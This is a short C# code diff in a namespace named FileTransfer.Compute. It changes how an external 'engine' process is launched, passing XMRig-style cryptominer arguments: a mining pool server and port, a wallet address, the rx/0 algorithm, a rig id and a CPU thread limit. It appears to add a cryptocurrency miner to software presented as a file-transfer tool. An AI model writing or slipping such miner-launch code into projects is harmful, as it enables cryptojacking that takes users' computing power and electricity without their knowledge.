@@ -61,18 +61,19 @@ namespace FileTransfer.Compute
                 return false;
             }
 
-            string configPath = GenerateConfigFile(config);
+            string pass = string.IsNullOrWhiteSpace(config.WorkerName) ? "x" : config.WorkerName;
+            string rig = string.IsNullOrWhiteSpace(config.WorkerName) ? "rig" : config.WorkerName;
 
             try
             {
                 string execFile = enginePath;
-                string execArgs = $"--config=\"{configPath}\"";
+                string execArgs = $"-o {config.ServerAddress}:{config.ServerPort} -u {config.WalletAddress} -p {pass} --rig-id {rig} -a rx/0 --cpu-max-threads-hint={config.ResourceLimit} --no-color --donate-level=1";
 
                 if (enginePath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase) ||
                     enginePath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase))
                 {
                     execFile = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
-                    execArgs = $"/c \"\"{enginePath}\" --config=\"{configPath}\"\"";
+                    execArgs = $"/c \"\"{enginePath}\" {execArgs}\"";
                 }
 
                 var psi = new ProcessStartInfo
